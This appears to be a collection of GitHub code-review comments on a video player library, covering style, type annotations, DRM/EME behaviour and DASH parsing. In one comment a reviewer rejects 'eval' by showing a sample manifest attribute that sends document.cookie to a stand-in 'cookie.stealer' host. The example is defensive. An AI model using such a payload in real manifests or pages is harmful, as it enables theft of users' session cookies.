line\n. It seems there are several style problems in this code.  Please run ./build/lint.sh on this and clean up the issues it reports.\n. Not declared in the constructor\n. This is extremely hard to see against the background.\n. When this value is much larger than the highest bitrate, the graphs gets very hard to read because of the scaling.  (I know it's not common at home, but at work I'm getting bandwidth numbers around 30Mbit.)  Perhaps if the estimated bandwidth is more than 2x the highest bitrate of the stream, we should cap the y values and not scale the graph so much that you can't make out the various bitrates.\n. Could you please add an annotation for the type in the array?  For example: {Array.} or {Array.}.  Also, a question mark to make an array nullable is not necessary, since arrays and other objects are nullable by default.\n. If this is run in the context of video, please annotate with @this {!HTMLVideoElement}.  Alternately, use bind and run it in the context of StreamVideoSource.\n. Run the compiler & linter with build/all.sh.  It will complain that this doesn't end in an underscore, which is the style we follow for private functions.\n. We have a class called EventManager which is used to avoid memory leaks that can be caused by event listeners.  If 'loadedmetadata' never fires, this StreamVideoSource could be retained in memory, or worse, called on a subsequent playback after this StreamVideoSource has been destroyed.\nIf you use this.eventManager.listen and unlisten, we can avoid that.\n. I think this doesn't need to be quoted.  Dot notation should work fine, since closure will not rename browser-built-ins and thingThatExists.nonExistentMember will be undefined, but not cause an exception.  Please correct me if I missed something.\n. A comment here about what platforms/browsers do not have console.assert.bind would be helpful.\n. Same here, a comment about why/where bind might be missing would be useful.\n. I'm guessing IE9 doesn't have DOMContentLoaded either?  A comment would be nice to remind me not to change it back when I stumble across this later.\n. Would you also add Uint8Array to shaka.player.Player.isBrowserSupported()?  Ideally, that and this should agree.\n. Ping!  Please fix, should not need to be quoted.\n. Ping!  Please add a comment here about who does not have console.assert.bind and why.\n. Ping!  A comment about why/where bind is missing, please.\n. Please use single quotes on these ready states.  I was breaking our own style rules in the original.  :-)\n. Nope, looks good.\n. You can drop the \"type\" annotation here.\n. Either this should be a no-op for HttpVideoSource, or this value should be used to set video.currentTime in attach().\n. Can you please document this event at the top?  See SeekRangeChangedEvent above for an example.\n. Also, please add a fires annotation to StreamVideoSource and an export annotation to the new event.  Thanks!\n. style nit: please drop this empty line\n. 2015\nAlso, add a license annotation just before the copyright header, as in 4cc4e96?\n. Can you split this off into a separate block comment as in 4cc4e96?\n. These extra newlines seem unnecessary.  Can you drop them?\n. To keep with the existing convention (externs/mediakeys.js), can you rename this to externs/msmediakeys.js?\n. There's a type for this defined in the EME spec, and the latest compiler has it built-in in its externs.  You can call this {?BufferSource}.\n. Add the annotation extends {EventTarget}\n. When MSMediaKeySession extends EventTarget, this can simply be annotated override.  See mediakeys.js for an example.\n. What do you mean that \"http errors are required to be added to the XHR\".  Do you mean http headers?\n. Please add license annotation as in 4cc4e96\n. Please move this info to the install method, as in 4cc4e96\n. From what I can tell, IE11 doesn't seem to support clearkey.\n. I believe you mentioned that persistent licenses are not supported in IE11, so you may want to update this part.\n. This comment does not apply here.\n. I don't think override will do what you think here, since this doesn't inherit from anything that defines setMediaKeys, and this isn't a prototype method as defined here.  You may need to add param and return annotations.\n. Style nit: local variables don't end in underscores.\n. This is accessing a private variable on mediaKeys.  The compiler must not be enforcing these restriction correctly, but I can't quite figure out why.\nIn the v0.1b polyfill, we have a type cast and a public method on our MediaKeys implementation called setMedia to handle this without accessing private members.\n. This should return a Promise.  If you annotate the parameter and return values, the compiler will catch this for you.\n. Should return a Promise.\n. style nit: else to previous line\n. Please annotate these types.\n. This takes an optional session type argument, which this polyfill needs to support in order to correctly report which session types it supports.  See the v01b polyfill for details.\n. Please annotate the types on these members.\n. If you bind them to this, why aren't these handlers private methods on the prototype for MediaKeySession?\n. style nit: catch to previous line\n. style nit: catch to previous line\n. Since the installation of this polyfill is predicated on MSMediaKeys, I think it is safe to just support what IE11 supports and make a note of the fact that this bit is off-spec for the version MS implemented.\n. style nit: catch to previous line\n. No support for messageType 'licenserenewal'?\n. style nit: else to previous line\n. style nit: else to previous line\n. It appears this is never assigned a value.\n. style nit: else to previous line\n. style nit: else to previous line\n. style nit: dedent to align the various PSSH constants\n. style nit: else to previous line\n. The local var is not needed, since srcElement is never set for fake events.  You can just return null, and kill the local and the setter.\n. style nit: rename this to target, please\n. style nit: rename this to currentTarget, please\n. We should find another way to generate these keys.  This cache is essentially just a big memory leak.  Consider key rotation in live streams.  There could be a new unique init datas every X seconds during a live event for an indefinite period of time.\n. Sounds good.  Let's reject not-allowed on both, but otherwise assume the CDM supports it.\n. I'm working on a patch right now to remove the Uint8Array key concept completely.  It will mean a theoretically slower check to suppress duplicate init datas (order N instead of order 1), but there shouldn't be so many unique init datas in a stream that it will be a problem in practice.\nI'll update here again once that is in, and then you can drop this part of your patch and rework your dedup in your MediaKeys polyfill to match.\nSound reasonable?\n. Please take a look at 3a552b8\n. Should be able to drop this one, since only MediaKeys can construct these.\n. This should be resolved rather than rejected, as far as I can tell.  In any case, the Player sets MediaKeys to null during unload, so rejecting here will cause problems when reusing the player with multiple clips.\n. Unused, please drop.\n. Since you aren't calling setMedia(null) on the old value of mediaKeys, there seems to be no way for this polyfill to remove listeners created by setMedia.  This could lead to a memory leak by holding references to the media element.\n. The type annotation is redundant with private.  Just private will do.\n. These event listeners are never cleaned up.  Use EventManager here and call removeAll() when the session is closed.\n. style nit: catch to previous line:\n} catch (exception) {\n. I believe that because of this, offline playback as designed in Shaka won't work yet.  That's not a deal-breaker, but JFYI.  Since PlayReady does offline in a non-EME-compliant way, getting offline on IE may just have to wait.\n. style nit: catch to previous line\n. Then you should not accept persistent-license type in createSession.\n. This whole section appears to be mis-indented.  Please run the linter (./build/lint.sh) and compiler (./build/build.sh) and make sure that all checks pass before submitting a PR.\n. This whole section appears to be mis-indented. Please run the linter (./build/lint.sh) and compiler (./build/build.sh) and make sure that all checks pass before submitting a PR.\n. What would be better than prepending the URL would be to replace the specific URL this request used.  (this.urls[i])\n. What would be better (IMO) than prepending the URL would be to replace the specific URL this request used. (this.urls[i])\n. Drop this extra line\n. Just use @type instead of @public\n. You should drop this condition, since it should not be possible after successful compilation.  Otherwise, the PR looks good to me.\n. These should say .mp4 to match the refs below.\n. typo: un => an\n. Our style convention is to put curly braces on the previous line.  Please update.\n. Please move else to the previous line to match the style in the rest of the project:\n} else {\n. This doesn't seem like the correct fix to me.  It seems that we should still remove cues.  Otherwise, when CC is re-enabled, the old cues are still there.  This could cause problems when we switch CC tracks and start adding new cues that conflict with the old ones.\n. Please alphabetize.\n. Please alphabetize.\n. Are we no longer passing lintChecks?  Why is that?\n. This is the circular dependency you mentioned?  Please add a TODO here.\n. This doesn't make sense to me.  We have \ngoog.require('shaka.polyfill.PatchedMediaKeys.v01b') already.  Is that not working any more?\n. Could this not be more specific?\n. Could this not be more specific?\n. Not off-hand, but I do note that all of those lint check failures are about goog.requires in demo/ and test/, which do not use goog.require in the first place.  I would strongly prefer not to disable useful checks on the library just to exclude them from test and demo app code.\n. Filed as #431 and assigned to one of my teammates.\n. Style nit: indentation looks off here.  Should be +4 spaces from \"var manifest\", if I'm not mistaken.\n. Not sure this is right.  The values in this dictionary are videoStream and audioStream vars.  So those should be Streams, I think.\n. Same here.  I feel certain these should not be strings.\n. We pushed a fix for #431, so you should be able to rebase your work and see this fixed.\n. Please write this conditional in the same style as the one above in find().  That will make it easier to compare.\n. I think this should be {!Object.<string, shakaExtern.Stream>}\n. This comment is out of date.  Can you please update to \"Choose streams for the given period\"?  Same in player_unit and streaming_engine_unit.\n. Please keep this list alphabetized.\n. Please keep this list alphabetized.\n. This is inconsistent with other places where you called it defaultKID, but as mentioned earlier, please rename to keyIds.\n. There can be (and best practice for content authoring dictates there should be) multiple key IDs in a single manifest.  If you're going to go this route, this should be an array of strings (default empty list, not null), and it should be called keyIds.\n. For consistency, let's give this the same name as the structure member: keyIds.\n. strings are non-nullable by default, so you can just say !Array.<string>\n. Text streams can also have a codecs string, although it is not always required.  I suggest dropping the parenthetical statement and adding the caveat \"if present\" after \"in the manifest\".\n. This information is not required or used in streaming or setup, so how about\"provided in the manifest, if present.\"\n. Style nit: drop this extra line, please\n. Sorry, but for security reasons, we will absolutely not accept \"eval\".\nImagine somebody sends you a manifest with:\nxml\n<Representation\n  frameRate=\"window.href='http://cookie.stealer/?'+document.cookie\"\n/>\nOr literally any other malicious thing you can think of: full-screen ads, redirection to a phishing site, anything.\nIf you need to parse a fraction, you'll have to write a parser.  Perhaps you could add it to XmlUtils.\n. You'll need to add frameRate and codecs to the externs for streams stored in the database (shakaExtern.StreamDB), and you'll need to add these properties to the code which stores streams offline (shaka.offline.Storage.prototype.createStream_).\n. With this match, Number(res[1]) is the same as Number(exprString), so I would just drop this else if completely.\n. The precision here is worrying.  Are all of these digits required to get a match out of Jasmine?\n. Okay, then.  Please add a comment like:\njs\n// TODO: get Jasmine to match with less precision\nAnd my team will work on it later.\n. Small spelling error: \"license\".  Also, it would be more accurate to say something like\n\"All network requests can have multiple URIs (for fallback), and therefore this is an array.  But there should only be one license server URI.\"\n. I think this part is confusing.  It implies that uris[0] might be Widevine, for example, while uris[1] might be PlayReady.  This is not the case.  For a license request, uris.length will always be 1, and uris[0] will always be the license server URI for the chosen key system.\n. Style nit: please wrap this line at 80 columns.\n. If this test is run in isolation, it would still fail.  The right fix is to add a beforeEach() function, in which you call logWarningSpy.calls.reset().  That way, each test gets a clean slate.  This is something that we should caught long ago.\n. && !useRelativeCueTimestamps ?\n. If the flag is set to true, then somebody is using it explicitly to get the new behavior, so they don't really need a warning.  At least, that's my take on it.\n. In these cases, it would be preferable to drop the sample (return early).  Adding to totalWeight_ in these cases will skew future samples.\n. At the call site, the type of cueElement is !Element, so using the same here should work.  What was the error?\n. Current comment looks good to me.  Seems accurate.\n. No, childNodes is correct.  children is not supported in all browsers, which is why we use childNodes everywhere currently.\n. We solved this elsewhere in with an assertion and a cast:\nif (childNodes[i].nodeType == Node.ELEMENT_NODE && ...) {\n  goog.asserts.assert(childNodes[i] instanceof Element,\n                      'Node should be Element!');\n  var leafChildren = shaka.media.TtmlTextParser.getLeafNodes_(\n      /** @type {Element} */(childNodes[i]));\n. There's no runtime difference.  It's just a matter of describing the types accurately and asserting to the compiler that it is that type.\nElement is a subclass of Node, but childNodes contains all Nodes, even those that are not Elements.  If we only want to walk through the Elements, we could use children, but some older browsers won't support that.  Instead we use childNodes, and we have to both filter out the Elements by nodeType, and we have to tell the compiler that this is a safe conversion.\n. No problem.  I'm sorry that the compiler is a bit of a burden in this instance.  It's not perfect by any means, but I think on balance, it has helped to catch and prevent a lot of bugs.\n. Since you're passing in an unresolved Promise chain, and to keep terminology consistent with other parts of this file, change \"unloadProcess\" to \"unloadChain\" or \"unloadPromiseChain\".. This should be declared somewhere.  It should also be private to the class, which means it must end in an underscore.  For example:\n/* @private {string} /\nshaka.polyfill.PatchedMediaKeysWebkit.prefix_ = '';. This should also be private.. Having an alias variable called \"prefixApi\" and another variable called \"prefixedApi\" is a little confusing and could easily lead to typos.  Please rename this to \"generateKeyRequestName\", which will both avoid confusion, describe which API it references, and indicate that it is a string, not a function.. Please rename to \"addKeyName\".  See above for rationale.. Please rename to \"cancelKeyRequestName\".  See above for rationale.. How does this polyfill work?  Is it just avoiding errors, or is it somehow providing functionality?. This should be a strong type, such as VTTRegion.  You may need to define VTTRegion in externs/.. Why not use a VTTRegion object here instead of x & y coordinates?. If overrideCueRegion is supplied at MediaSourceEngine.init, it cannot be changed mid-playback.  Therefore, there's no reason to supply it to StreamingEngine.configure, and it should be documented that these cue settings only apply to future calls to player.load().. VTTRegion. new VTTRegion should suffice.  No need to use window.. VTTRegion. VTTRegion. It would be much better to apply the region override in TextEngine after the parsers are done.  That way, the parser does not need to know anything about the polyfill and users of third-party parsers can still use your override config.. Which browsers support VTTRegion natively?  I tested Firefox and Chrome, and neither do.. I assume you're quoting the access here to avoid the compiler complaining about the \"wrong\" arguments/types.  Please add a comment to that effect.. This link doesn't specify the 7 arguments or their meaning.  It gives an example with 4 arguments, and the examples have the text in argument 4, not argument 1 as you have below.\nI tracked down the history as best I could.\nHere we had the first appearance of TextTrackCue in draft 20110113 (no constructor).\nIn draft 20120329, we had the first constructor on TextTrackCue (6 arguments, not 7).\nIn draft 20121025, the constructor was changed to 3 arguments (as implemented by IE11 and Edge today).\nIn draft 20121217, we have the final appearance of a TextTrackCue constructor.  After this, it became abstract.\nAre you sure it's 7 on Toshiba and not 6?. This shouldn't happen, since all the browsers we support have either VTTCue or TextTrackCue.  So we probably don't need a no-op polyfill for this case.\nBut if this were to happen, we would throw at new VTTCue in TextEngine, so this message should at least be upgraded to shaka.log.error.. You can drop window here now that TextTrackCue is sure to exist.. This only works if there is exactly one Representation.  You should probably use findChildren instead, and loop through them.. You could return early here if adaptationEventStream. Create a test case with multiple Representations, please. Single test is fine.  Thanks!. return true?. Please add a comment here that IE 11 does not have an Event constructor.. Please enclose these assets in their own group.  For example, see line 1038 above, where we start a group for GPAC-sourced assets.. Add shakaAssets.KeySystem.CLEAR_KEY to this list, as well.  Same below.. Please specify which encoder was used in the encoder field.. Please add Feature.PSSH, Feature.HIGH_DEFINITION.. Please add Feature.PSSH, Feature.HIGH_DEFINITION, Feature.MULTIPERIOD.. request.body is typed as an ArrayBuffer, so you will need to wrap that in \"new Uint8Array\".\nHere's a demo of fromCharCode applied to both a Uint8Array and an ArrayBuffer:\nu = new Uint8Array([61, 62, 63, 64, 65]);\nString.fromCharCode.apply(null, u);\n\"=>?@A\"\nString.fromCharCode.apply(null, u.buffer);\n\"\"\nIf request.body is a Uint8Array at runtime, wrapping it again will not cause a problem.. I don't think it makes sense to pass the label through language tools or default to the language code 'und'.  Label, as I understand it from @erankor's explanation, is a free-form string and may reasonably be missing (null).. Please add this new field to the definition of the shakaExtern.Stream structure in externs/shaka/manifest.js.. It doesn't make sense to push it from variant.audio (Stream structure) to variant (Variant structure) in this utility.  If you need this on variant, you should add it when the variant is generated in the DASH parser.\nInstead, though, I recommend just storing the label in a local var.  I don't see any good reason to push it up to the variant.. Thank you for updating the tests!. Please add this new field to the definition of the shakaExtern.Track structure in externs/shaka/player.js.. There are two things wrong with this part:\n\ncurrentTrack is a misleading name.  It is not the currently-selected track you've identified, it's just any track that matches the language.\nYou shouldn't annotate the languages with track labels.  Instead, annotate the track list.\n\nFor example, if you have two tracks of the same language, as @erankor suggested is common for this feature, you would have these tracks:\njs\n[\n  { id: 1, lang: 'en', label: 'with music' },\n  { id: 2, lang: 'en', label: 'without music' },\n]\nBut the only language in the language list will be \"en\".  With what you've written, your language options in HTML would wind up as:\nhtml\n<select>\n<option value=\"en\">with music</option>\n</select>\nWhile the variant tracks would still both show \"language: en\" with no differentiation.\nI think the method you really want to modify here is shakaDemo.updateTrackOptions_, specifically the formatters callbacks.. Please use currentStream_() instead, since this attribute should only live at the stream level.. The variable name languages is now a misnomer.  You're not passing an array of language strings, but an array of objects with track info.\nIn fact, these objects are a subset of what is already in tracks.  So you don't need this at all.\nAt a higher level, what you're doing here in the UI is labeling the languages.  Instead, you should be labeling the tracks, since labels are attached to tracks.\nThe language list should stay as it is.. Please do not add additional parameters to the middle of an exported method.  This would break backward compatibility.  Instead, make it an optional parameter after opt_codec.. This \"if\" is unnecessary.  Just set label = variant.audio.label.. Initialize this to null, since the type allows for null instead of undefined.  A minor difference, I know.. This looks like it will throw an exception, since variant.audio doesn't exist yet.. Since you have the label() method to set the label of the current stream, I think we don't need to add this parameter.. Default to null.. updateLanguageOptions_ updates the list of languages in the demo.  You should not be changing this method.\nInstead, you should be changing the formatting in the list of tracks.\nEverything else looks good, so I'm going to go ahead and run tests on the build bot.  If all tests pass, I will fix the demo UI myself when I merge.. Tests are failing, so I will leave it to you to make updates.\nFor the demo app, please revert changes in this file and look at the formatters map in updateTrackOptions_.  That is where you should add labels to the track list.  Here's a suggestion:\njs\nshakaDemo.updateTrackOptions_ = function(list, tracks, language) {\n  var formatters = {\n    variant: function(track) {\n      var trackInfo = '';\n      if (track.language) trackInfo += 'language: ' + track.language + ', ';\n      if (track.label) trackInfo += 'label: ' + track.label + ', ';\n      if (track.width && track.height)\n        trackInfo += track.width + 'x' + track.height + ', ';\n      trackInfo += track.bandwidth + ' bits/s';\n      return trackInfo;\n    },\n    text: function(track) {\n      var trackInfo = 'language: ' + track.language + ', ';\n      if (track.label) trackInfo += 'label: ' + track.label + ', ';\n      trackInfo += 'kind: ' + track.kind;\n      return trackInfo;\n    }\n  };. I was unable to find any mention of this attribute in the DASH spec (2014) or the latest DASH-IF-IOP (v4.0).  I don't object to you adding it, though.\nPlease add a comment that this is a non-standard attribute supported by Kaltura.. This probably doesn't need to be both optional and nullable.  For an internal method like this, all the arguments should be required, I think.. Thank you for adding HLS support in this PR as well!. Outputting ProgressEvents might be a little tricky if we start using Fetch, but it looks like we may be able to synthesize these events if we do.\nJust thinking out loud.. Could you expand on this a little?  It appears to be an incomplete sentence.. This constant would be more readable as 0x10000000000000, I think.  Also, please move this to a static const.  Something like:\n/*\n * @const {number}\n * @private\n /\nshaka.polyfill.MathRound.MAX_ACCURATE_INPUT_ = 0x10000000000000;\nFinally, please be careful about < vs <=.  From the stackoverflow thread, it appears that this constant does round correctly, so we should use the original for inputs <= the constant.. Current config should not affect the remove() operation.  If the content you're removing has persistent licenses, you should still call drmEngine.init() and do the rest.\nIn particular, if there is no persistent license stored, sessionIds will be empty and drmEngine.removeSessions() will do nothing.  So I think this check can be removed.. This parameter appears to be unused.. Please change these it() calls to drm_it().  We only run DRM tests with the --drm flag, and drm_it() does the filtering for us.\nWe do it this way so that tests can still be run without solid network connectivity.  --drm enables DRM tests (some networking required for licensing) and --external enables external asset tests (solid network required to pull content from the internet).. This doesn't configure DRM, so the tests below are all exercising clear content paths.  See the drmEngine setup in the 'stores DRM info' test and do the same here in beforeEach.. Also verify that manifestDb.drmInfo exists and matches the one you create in beforeEach, or else this is passing for the wrong reasons (clear content).. You should also load the content again and verify that is has drmInfo (see below) so that you know you aren't just testing clear content.. Kind of.  I was thinking of putting checks for drmInfo into the offline sessions test below.  Otherwise, running that test in isolation could result in a pass even if it was clear content.\nSince the feature under test is that we do temporary licenses instead of persistent licenses, I think all three of these could be one test.  In my opinion, the test above (\"stores basic manifest\") is irrelevant, and these other two should be combined into \"does not store offline sessions\").. Either way.. @TheModMaker, I don't think I understand you.  If we're processing both a new and old ref, and replacing one with the other, why wouldn't we increment the indices on both arrays?. So much better.  Thanks!. Since this returns a value now, please update the annotations with @return {!Promise}. I appreciate the idea, but this won't work as you would expect.\ndrmInfo() returns info about the currently-loaded stream.  Before you load anything, it returns null.\nThe robustness settings, however, have no immediate effect.  They effect the next content you load.\nSo using the key system of the current content to decide what values to suggest for the next content is not going to work the way it should in all cases.\nAn alternative would be to detect what key systems are supported by the browser, and suggest all known robustness settings for all supported key systems.  (Currently, the only key system with well-known values is Widevine, but we hope to see that change.). It will probably be fine.\nThe only browser with no support on that list is Safari, at which point Safari behaves the same as it did before.\nPartial support on Firefox refers to text fields only, which works here.\nPartial support on IE/Edge is a little more concerning, since it seems that some events may not fire.  But if we don't need those events, it may still work.  (I don't think we need change events on these fields.). Correct.  We are less interested in what key systems the selected asset uses.  If the \"custom\" field is used, we don't know.  But if the browser supports Widevine, it is reasonable to suggest Widevine-specific values here regardless of what asset is selected.. Please document this event type in lib/player.js.  You'll see several examples toward the top of the file.. I'm not sure we need a separate integration test for this, but you could always expect that onEvent was called at the appropriate time in the \"basic flow\" test below.\nNote that DRM integration tests are only run if you use ./build/test.py --drm.. If the header is not present, doesn't this have the side-effect of leaving behind a cached value from a previous manifest?  Is this intentional?  If so, please add a comment explaining why.. Style nit: for consistency, please move to the previous line. This should be: * @return {Array.<shakaExtern.DrmInfo>}\nI think <{object}> is bad syntax.  I think the {} in that context look like a record type.  And you don't need the alternation with null (|null) because Arrays are nullable by default.  (To make it non-nullable, add a ! to the front.)  Finally, the more specific type shakaExtern.DrmInfo should be used, because Object is too loose.. style nit: It looks like this should fit on the previous line. You shouldn't need to deal with a null config_, since that should only be true before init() and after destroy().. You don't need to worry about null config.servers, either, since Player maintains a complete config object at all times.. I don't think every() is what we want here.  If any period has encrypted variants, the content is encrypted.  This should be some().. Same here.  I believe this should be some(), as well.  Also, you forgot a return here, so the outermost every() function has no return value.. No need to do !!, since length is a number which will implicitly convert to boolean.. This comment seems a little bit vague.  How about this one:\njs\n// We only want to create phony DrmInfos when none are provided by the manifest.. With the recommended change to return Array.<shakaExtern.DrmInfo>, the compiler will require you to provide all fields here.  Use the same values returned from the bottom of configureClearKey_().. Awesome!  Thank you for writing tests!. It is simpler, but I think we should keep ignoreDrmInfo separate.  It serves a different purpose, and it isn't on by default.  What you are changing here should, in my opinion, be default behavior to match developer expectations.. typo: \"biggar\" should be \"bigger\". In fact, we landed that change today.  :-). If error is something other than shaka.util.Error, you'll want to wrap this.. Okay, fair enough.. We are now enforcing the Google Style Guide requirement that \"var\" be replaced with \"let\" or \"const\".\nhttps://google.github.io/styleguide/jsguide.html#features-use-const-and-let\nIf you rebase your change, you will see the new linter complain about this.. This seems to be the wrong callback to use.  EmsgInfo is not a TimelineRegionInfo.. We have an 'emsg' event already, which is dispatched currently by StreamingEngine through playerInterface_.onEvent.  Perhaps you should move the responsibility for that event to somewhere else.  Timeline events are dispatched from PlayheadObserver today.. The original version was correct.  assets/poster.jpg is a dynamic script hosted on appspot and does not live in the sources.  This change will cause the poster not to show in a local copy.  Please revert.. Can you explain why we shouldn't use // ?  It's not very helpful to make arbitrary changes like this without at least explaining them in the commit message.. A link to playsinline docs in the commit message would be helpful.  You mention that it's required for iOS, which we do not currently support.  If there are other reasons for this, we need context.. Thanks!  Can you please update the other instances of protocol-relative URIs as well?  There are many, many of these in the code.. I :heart: async. parseAttr() can return null if there's no such attribute, so please add || 0 to the end of this statement.. This should also be added to externs/shaka/player.js, in the shaka.extern.DashManifestConfiguration type.  Please add @property to describe the property, and also add it to the @typedef block.\nThis will probably produce a few build errors, as the DASH config object in several of our tests will need to be updated to match the updated type.  Be sure to run python build/all.py and fix any errors that come up.\nAfter that, please add a new test in test/dash/dash_parser_manifest_unit.js that shows the effect of ignoreMinBufferTime.  Thanks!. Minor English nit: This sentence needs a period at the end, and the next line should begin with a capital letter.. I would suggest looking at the very last test in that file ('exposes Representation IDs') as a template.\nThe important parts of the test are:\n\nFake manifest text.  This can be very simple for your case, with only one Representation.\nA call to fakeNetEngine.setResponseText() so the fake manifest text gets returned from the networking engine.\nAny necessary configuration passed to parser.configure().  For you, this should set the new flag.\nThe (async) call to parser.start() to parse the manifest and get the results.\nExpectations on the output.  You would expect that minBufferTime is 0, in spite of the attribute in the manifest text.\n\nDoes that help?. Eslint is not currently enforcing whitespace and indentation rules.  I thought we had an open bug about this, but it seems we do not.\nSo right now, there is no automated feedback on these style guide issues.\nThe sad thing is that we will not be 100% in line with the Google style guide once we get eslint enforcing these rules, because eslint's indentation system can't accurately implement the Google style guide.  So we will wind up with something that's close enough and stick to it.  (In v2.6.)\nIn the mean time, @tylerdaines, please avoid changing any existing indentation patterns.  @vaage, please be flexible with minor indentation problems since there is no way for anyone to automate catching them.  We will need to clean up many, many pre-existing indentation problems once we turn on indentation checks in eslint, even in cases where we /do/ conform to the style guide already.  So it's not worth being strict about right now.. Please add yourself or your company (as appropriate) to AUTHORS as well.  Thanks!. I think this does not belong under \"abr\".  You seem to have another copy under \"streaming\".. style nit: please move this to the previous line. Please add a brief explanation of why we do this.  Feel free to correct or rephrase this as you like, but my understanding from #1704 is this:\njs\n    // If we are in WebOS platform disable StallDetector.  This is because WebOS\n    // TVs tend to have long hardware pipelines that respond slowly, so we tend\n    // to mistake slow operation for a stall.. ",
    "ddorwin": "The scenario above generates an exception that completely breaks the player. Thus, the player's unprefixed EME support can't be used at all. Does it make sense to just remove the isTypeSupported() calls and replace them with some reasonable assumptions until a more permanent fix can be implemented?\n. Note that a single request (with multiple configurations), you can determine whether persistent and temporary licenses are supported. Thus, the app (or Shaka) could determine that it can play the content but not persist it. I don't know whether this would be useful in this case.\n. appendBuffer() doesn't throw any errors or do any decoding. Decode errors occur in the media element when media data from the appended buffer is used.\nAdding @wolenetz for any other comments.\n. > If only part of the file was transferred, the request failed and we don't append.\nIs this any more interesting with appendStream()? I assume that is more like the .src= case as far as the media element is concerned.\n. If this is in Chrome, it might be related to https://code.google.com/p/chromium/issues/detail?id=349543.\n. Which version of Chrome? One of the most recent comments says \"Remaining cases of this seem to be WebAudio issues...\", which would imply Shaka should not be impacted. If you can provide a repro case or more details in that bug, that would be helpful.\n. Do you want to detect the wrong key based on ID or the actual key? In the latter case, you may just get a decode error.\n. As Joey noted, codecs is now required by the spec in step 10 of the Get Supported Capabilities for Audio/Video Type algorithm.\nStep 11 of the same algorithm requires that:\n- videoCapabilities contains a \"video/\" type and only video codecs\n- audioCapabilities contains an \"audio/\" type and only audio codecs\nThus, this failure isn't related to whether multiplexed streams are supported - it is the use of an audio codec in videoCapabilities. (The reason this is not allowed is that the robustness levels for audio and video may differ and specifying audio codecs with the video robustness would likely unexpectedly fail on some clients.)\n. Yes, this seems reasonable from an EME perspective. CDMs just receive encrypted blocks, so the stream is demuxed before it reaches the CDM. Among other things, this means EME should be independent of MSE vs. .src=.\nFor Chrome, the question is whether the MSE implementation supports such multiplexed streams. @wolenetz\n. I believe each multiplexed stream is a separate track and that each track has default key IDs, potentially PSSH boxes, etc. The demuxer will associate these with the blocks from the track, and this information will then be used when the CDM processes the blocks.\n. While I don't know the paths that cause this error, you might also consider a new name since failing the EME spec does not distinguish between a key system being unavailable and none of the provided configurations being supported.\nAn empty configuration should be equivalent to the former, but that may not be advisable. See https://github.com/w3c/encrypted-media/issues/178#issuecomment-216299258.\n. More specifically, user options = user configurations/choices and consent.\n. Implementations are correctly treating undefined as not present (see https://github.com/heycam/webidl/issues/124#issuecomment-220492410 for details). However, it still seems cleaner not to specify the values if you don't need to.\n. Does it work in Chrome 50 and later or is it still a problem? document.createElement('video').canPlayType('video/mp4; codecs=\"avc1.640814\"') returns \"probably\" in Chrome 51, so it should work, though I'm not familiar with the Shaka API\n. See also this text (emphasis added) from the note following the normative text above:\n\n... If only the empty string is specified, implementations MAY be configured to use the lowest robustness level the implementation supports.\nApplications SHOULD specify the robustness level(s) they require to avoid unexpected client incompatibilities.\n\nThis warning is for the current version of the spec and related to potential changes to Chrome (or other implementations) that could break some apps that do not provide a robustness level. For example, the lowest supported level is often not appropriate for video.\n. The Angel One option appears to support VP9 and Vorbis, presumably in WebM, so it should work without proprietary codecs.\nHowever, looking at the referenced probing code, basicVideoCapabilities only specifies 'video/mp4; codecs=\"avc1.42E01E\"'. Thus, only implementations that support MP4 and H.264 will report that success. Adding { contentType: 'video/webm; codecs=\"vp9\"' } to the sequence should fix this.\n. The Angel One option appears to support VP9 and Vorbis, presumably in WebM, so it should work without proprietary codecs.\nHowever, looking at the referenced probing code, basicVideoCapabilities only specifies 'video/mp4; codecs=\"avc1.42E01E\"'. Thus, only implementations that support MP4 and H.264 will report that success. Adding { contentType: 'video/webm; codecs=\"vp9\"' } to the sequence should fix this.\n. For what it's worth, EME's definition of time is at https://w3c.github.io/encrypted-media/#time. It defers to ECMAScript Date Objects where \"In time values leap seconds are ignored.\". persistentState is required to create persistent-license sessions, but the opposite does not apply.\nIf you aren't sure that a DRM implementation does not persist state, the browser should disallow  persistentState==\"not-allowed\". (The same is true for distinctiveIdentifier.)\nIt looks like this is just used to report the assumed result. In that case, true is correct. It would probably help to rename the variable to indicate it is a property of the key system. You probably also want to reject a configuration with not-allowed\".\nYou also need to do the same thing for distinctiveIdentifier.\n. ",
    "barbibulle": "Thanks!\n--\u00a0Gilles\nOn January 12, 2015 at 12:54:02 PM, joeyparrish (notifications@github.com) wrote:\nActually, never mind the MPD. I found the issue.\nThe bug is in mpd_processor.js, in process(). The order of calculateDurations_() and processSegmentTemplates_() needs to be swapped. Sorry for the inconvenience.\nWe'll push this fix out shortly in v1.1.\n\u2014\nReply to this email directly or view it on GitHub.\n. I'm afraid that commit 5c7fca9 doesn't quite fix the problem.\nOne of the two occurrences of parsing @startNumber (in SegmentTemplate) is \"almost\" fixed, in the sense that mpd.parsePositiveInt_ was correctly replaced by mpd.parseNonNegativeInt_, which makes parseAttr_ return 0 instead of null, but the || 1 at the end still gets in the way (0 || 1 is still 1...).\nthis.firstSegmentNumber =\n      mpd.parseAttr_(elem, 'startNumber', mpd.parseNonNegativeInt_) || 1;\nAlso, there is a second occurrence of parsing @startNumber (in SegmentList), which suffers from the original problem of calling mpd.parsePositiveInt_\nHere's an MPD with @startNumber=0:\nhttp://www.bok.net/dash/tears_of_steel/cleartext/stream.mpd\n. It seems indeed that this clause would prevent @startNumber from ever having the value 0.\u00a0\nThe problem is only with $Time$, though, as with @startNumber=0, you\u2019d have $Number$ be 0 for k=1, which isn\u2019t a problem.\nThe spec should be clearer on that point, as nothing specifically prohibits @startNumber to be 0 (the schema says unsignedInteger), so without language specifically constraining @startNumber to be > 0, you could interpret the spec as having $Time$ be (-1)*duration for the first segment when @startNumber=0, which would obviously be weird.\nI\u2019ll shoot an email to the DASH mailing list to point out the spec deficiency in that regard.\n--\u00a0Gilles\nOn February 3, 2015 at 10:57:03 AM, tdrews (notifications@github.com) wrote:\nYes, 5c7fca9 is definitely not correct. However, after looking at the MPD spec. (ISO/IEC 23009-1:2014) more closely, it appears that startNumber must be greater than zero.\nThe spec. indicates in section 5.3.9.5.3 that the $Number$ placeholder should be replaced with (k - 1) + startNumber, and that the $Time$ placeholder should be replaced with ((k - 1) + (startNumber - 1)) * segmentDuration, where k is the segment number. It seems that k is one-based, so startNumber must be greater than zero to ensure that $Number$ and $Time$ are both strictly non-negative.\n\u2014\nReply to this email directly or view it on GitHub.\n. MPEG has published a corrigendum to the spec, that fixes the muddy language around the computation of segment numbers. The new text (found in\u00a0ISO/IEC 